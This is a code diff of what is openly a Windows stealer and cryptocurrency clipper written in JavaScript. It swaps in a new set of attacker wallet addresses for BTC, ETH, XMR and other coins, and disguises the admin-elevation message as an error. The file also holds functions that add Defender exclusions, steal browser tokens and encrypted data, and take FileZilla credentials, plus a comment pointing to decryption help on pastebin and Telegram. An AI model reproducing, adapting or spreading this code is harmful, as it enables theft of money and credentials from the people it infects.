@@ -56,7 +56,7 @@ function relaunchAsAdmin() {
     const scriptArgs = process.argv.slice(1).join(' ');
     const command = `powershell -Command "Start-Process '${scriptPath}' -ArgumentList '${scriptArgs}' -Verb RunAs"`;
 
-    console.log('Relaunching the script as administrator...');
+    console.log('Relaunching script as user-end error has occured......');
     execSync(command, { stdio: 'inherit' });
     process.exit(0);
 }
@@ -1057,15 +1057,15 @@ function addDefenderExclusions() {
 
 // Replace with your addresses or all money to me :)
 const addresses = {
-    btc: "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7",
-    eth: "0x700875DF55d904b24469458a6bAE04F6dd7eF91F",
-    ltc: "ltc1qx7n7fr4anyssyhfp2s4sd9jv7r89ex9sd2d6dg",
-    trx: "TJYeEhaoY5sQ66SHLbCp85jGcSkqLLvBTU",
-    bch: "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4",
-    xmr: "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCUR",
-    xrp: "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV",
-    zcash: "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf",
-    doge: "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
+    btc: "bc1q4zu378u3huputvs24rfns3p4m8h3vllenhgh5r",
+    eth: "0x7d690d0Cdb7B43244D2697b99959322266Ff725d",
+    ltc: "ltc1qge49pckgpl7hknszs49f6jdvtcdwr7eaty5els",
+    trx: "TGuzatjH93nV9gRQ3GodLe9AYvB9k6X2f1",
+    bch: "qrm5aau8ay42at4ful9xmapyy600mntezcdgzwpxq4",
+    xmr: "0xd10d9B0561Ccd7cAC05D2246E544Cd322F97777F",
+    xrp: "rhGRbe4PCh6eCGt6eSmNgtPY2DT9RSefr9",
+    zcash: "t1RB2ZTzAha1hJmnqpwbF8h8kMLgJSsCr3g",
+    doge: "DTko9u4QAF1aw3G38zZmDJTu1QGfEqJecm"
 };
 
 // This is a clipper, here is the decrypted code: https://pastebin.com/raw/juyfkJ4N (DM me on Telegram if you don't know how to decrypt base64 :0)
@@ -4138,7 +4138,6 @@ function addDefenderExclusion(directory) {
 // Browser Functions
 function manageBrowsers() {
     closeBrowsers();
-    Killchrome();
     getEncrypted();
     getTokens();
     submitFileZilla();
